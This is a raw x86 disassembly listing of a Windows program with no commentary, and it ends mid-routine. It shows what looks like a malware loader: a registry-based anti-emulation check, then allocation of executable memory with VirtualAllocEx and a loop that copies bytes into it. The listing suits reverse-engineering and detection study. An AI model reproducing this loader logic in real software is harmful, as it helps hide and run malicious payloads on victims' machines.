0x00401000:	pushl	%ebp	; from: 0x004016d5(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0xc, %esp
0x00401006:	movl	0x8(%ebp), %eax
0x00401009:	movl	%eax, -8(%ebp)
0x0040100c:	movl	0xc(%ebp), %ecx
0x0040100f:	movl	%ecx, -12(%ebp)
0x00401012:	movl	$0x22b, -4(%ebp)
0x00401019:	movl	-8(%ebp), %edx
0x0040101c:	cmpl	-12(%ebp), %edx
0x0040101f:	jae	0x0040102f	; targets: 0x00401021(MAY)
0x00401021:	movl	$0x22b, -4(%ebp)	; from: 0x0040101f(MAY)
0x00401028:	movl	-8(%ebp), %eax
0x0040102b:	jmp	0x00401039	; targets: 0x00401039(MAY)
0x00401039:	movl	%ebp, %esp	; from: 0x0040102b(MAY)
0x0040103b:	popl	%ebp
0x0040103c:	ret	; targets: 0x004016da(MAY)

0x00401040:	pushl	%ebp	; from: 0x0040168a(MAY)
0x00401041:	movl	%esp, %ebp
0x00401043:	subl	$0xc, %esp
0x00401046:	movl	$0x1e4dc, -8(%ebp)
0x0040104d:	movl	$0x3000, -12(%ebp)
0x00401054:	movl	$0x40, -4(%ebp)
0x0040105b:	movl	-4(%ebp), %eax
0x0040105e:	pushl	%eax
0x0040105f:	movl	-12(%ebp), %ecx
0x00401062:	pushl	%ecx
0x00401063:	movl	0x8(%ebp), %edx
0x00401066:	pushl	%edx
0x00401067:	pushl	$0x0
0x00401069:	pushl	$0xffffffff
0x0040106b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000580(MAY)
0x00401071:	movl	%ebp, %esp
0x00401073:	popl	%ebp
0x00401074:	ret	; targets: 0x0040168f(MAY)

0x00401080:	pushl	%ebp	; from: 0x004016a8(MAY)
0x00401081:	movl	%esp, %ebp
0x00401083:	popl	%ebp
0x00401084:	ret	; targets: 0x004016ad(MAY)

0x00401090:	pushl	%ebp	; from: 0x004015db(MAY)
0x00401091:	movl	%esp, %ebp
0x00401093:	pushl	%ecx
0x00401094:	movl	$0x4, -4(%ebp)
0x0040109b:	movl	-4(%ebp), %eax
0x0040109e:	addl	$0x401a38, %eax
0x004010a3:	movl	%eax, 0x00420b4c
0x004010a8:	movl	%ebp, %esp
0x004010aa:	popl	%ebp
0x004010ab:	ret	; targets: 0x004015e0(MAY)

0x004010d0:	pushl	%ebp	; from: 0x00401675(MAY)
0x004010d1:	movl	%esp, %ebp
0x004010d3:	movl	0x8(%ebp), %eax
0x004010d6:	movl	-4(%eax), %eax
0x004010d9:	popl	%ebp
0x004010da:	ret	; targets: 0x0040167a(MAY)

0x00401340:	pushl	%ebp	; from: 0x00401701(MAY)
0x00401341:	movl	%esp, %ebp
0x00401343:	subl	$0x22c, %esp
0x00401349:	movl	$0x7c, -544(%ebp)
0x00401353:	movl	$0x0, -532(%ebp)
0x0040135d:	movl	$0x0, -552(%ebp)
0x00401367:	jmp	0x00401378	; targets: 0x00401378(MAY)
0x00401369:	movl	-552(%ebp), %eax	; from: 0x004013ba(MAY)
0x0040136f:	addl	$0x1, %eax
0x00401372:	movl	%eax, -552(%ebp)
0x00401378:	movl	-552(%ebp), %ecx	; from: 0x00401367(MAY)
0x0040137e:	cmpl	0x10(%ebp), %ecx
0x00401381:	jnl	0x004013bc	; targets: 0x00401383(MAY), 0x004013bc(MAY)
0x00401383:	movl	0xc(%ebp), %edx	; from: 0x00401381(MAY)
0x00401386:	addl	-552(%ebp), %edx
0x0040138c:	movzbl	(%edx), %eax
0x0040138f:	movl	%eax, -556(%ebp)
0x00401395:	movl	$0x7c, -544(%ebp)
0x0040139f:	movl	0x8(%ebp), %ecx
0x004013a2:	addl	-552(%ebp), %ecx
0x004013a8:	movb	-556(%ebp), %dl
0x004013ae:	movb	%dl, (%ecx)
0x004013b0:	movl	$0x33, -544(%ebp)
0x004013ba:	jmp	0x00401369	; targets: 0x00401369(MAY)
0x004013bc:	movl	%ebp, %esp	; from: 0x00401381(MAY)
0x004013be:	popl	%ebp
0x004013bf:	ret	; targets: unresolved


start:
0x00401560:	pushl	%ebp	; from: 0x004015d6(MAY)
0x00401561:	movl	%esp, %ebp
0x00401563:	subl	$0xc8, %esp
0x00401569:	pushl	%ebx
0x0040156a:	pushl	%esi
0x0040156b:	pushl	%edi
0x0040156c:	movl	%ebp, 0x00420c60
0x00401572:	pusha	
0x00401573:	movl	$0x0, -136(%ebp)
0x0040157d:	movl	$0x80000002, -156(%ebp)
0x00401587:	movl	RegOpenKeyW@advapi32.dll, %eax
0x0040158c:	movl	%eax, -180(%ebp)
0x00401592:	movl	$0x420030, -172(%ebp)
0x0040159c:	movl	$0x43, %ecx
0x004015a1:	movl	-172(%ebp), %edx
0x004015a7:	movw	%cx, (%edx)
0x004015aa:	movl	$0x4c, %eax
0x004015af:	movl	-172(%ebp), %ecx
0x004015b5:	movw	%ax, 0x2(%ecx)
0x004015b9:	leal	-176(%ebp), %edx
0x004015bf:	pushl	%edx
0x004015c0:	movl	-172(%ebp), %eax
0x004015c6:	pushl	%eax
0x004015c7:	pushl	$0x80000000
0x004015cc:	call	-180(%ebp)	; targets: 0xff000550(MAY)
0x004015d2:	testl	%eax, %eax
0x004015d4:	je	0x004015db	; targets: 0x004015d6(MAY), 0x004015db(MAY)
0x004015d6:	call	start	; targets: 0x00401560(MAY)	; from: 0x004015d4(MAY)
0x004015db:	call	0x00401090	; targets: 0x00401090(MAY)	; from: 0x004015d4(MAY)
0x004015e0:	movl	$0x64, -124(%ebp)	; from: 0x004010ab(MAY)
0x004015e7:	movl	$0x28, -24(%ebp)
0x004015ee:	movl	$0x0, -136(%ebp)
0x004015f8:	movl	$0x0, -80(%ebp)
0x004015ff:	movl	$0x1, -120(%ebp)
0x00401606:	movl	$0x0, -16(%ebp)
0x0040160d:	movl	$0x64, -124(%ebp)
0x00401614:	movl	$0x28, -24(%ebp)
0x0040161b:	movl	$0x0, -136(%ebp)
0x00401625:	movl	$0x0, -80(%ebp)
0x0040162c:	movl	$0x1, -120(%ebp)
0x00401633:	movl	$0x3, -20(%ebp)
0x0040163a:	movl	$0x0, -16(%ebp)
0x00401641:	movl	$0x64, -124(%ebp)
0x00401648:	movl	$0x28, -24(%ebp)
0x0040164f:	movl	$0x0, -136(%ebp)
0x00401659:	movl	$0x0, -80(%ebp)
0x00401660:	movl	$0x1, -120(%ebp)
0x00401667:	movl	$0x3, -20(%ebp)
0x0040166e:	movl	0x00420b4c, %ecx
0x00401674:	pushl	%ecx
0x00401675:	call	0x004010d0	; targets: 0x004010d0(MAY)
0x0040167a:	addl	$0x4, %esp	; from: 0x004010da(MAY)
0x0040167d:	movl	%eax, -140(%ebp)
0x00401683:	movl	-140(%ebp), %edx
0x00401689:	pushl	%edx
0x0040168a:	call	0x00401040	; targets: 0x00401040(MAY)
0x0040168f:	addl	$0x4, %esp	; from: 0x00401074(MAY)
0x00401692:	movl	%eax, -132(%ebp)
0x00401698:	movl	-140(%ebp), %eax
0x0040169e:	pushl	%eax
0x0040169f:	pushl	$0x0
0x004016a1:	movl	-132(%ebp), %ecx
0x004016a7:	pushl	%ecx
0x004016a8:	call	0x00401080	; targets: 0x00401080(MAY)
0x004016ad:	addl	$0xc, %esp	; from: 0x00401084(MAY)
0x004016b0:	movl	-140(%ebp), %edx
0x004016b6:	movl	%edx, -148(%ebp)
0x004016bc:	movl	-136(%ebp), %eax
0x004016c2:	cmpl	-140(%ebp), %eax
0x004016c8:	jae	0x00401738	; targets: 0x004016ca(MAY)
0x004016ca:	movl	-148(%ebp), %ecx	; from: 0x004016c8(MAY)
0x004016d0:	pushl	%ecx
0x004016d1:	movl	-124(%ebp), %edx
0x004016d4:	pushl	%edx
0x004016d5:	call	0x00401000	; targets: 0x00401000(MAY)
0x004016da:	addl	$0x8, %esp	; from: 0x0040103c(MAY)
0x004016dd:	movl	%eax, -152(%ebp)
0x004016e3:	movl	-152(%ebp), %eax
0x004016e9:	pushl	%eax
0x004016ea:	movl	0x00420b4c, %ecx
0x004016f0:	addl	-80(%ebp), %ecx
0x004016f3:	pushl	%ecx
0x004016f4:	movl	-132(%ebp), %edx
0x004016fa:	addl	-136(%ebp), %edx
0x00401700:	pushl	%edx
0x00401701:	call	0x00401340	; targets: 0x00401340(MAY)
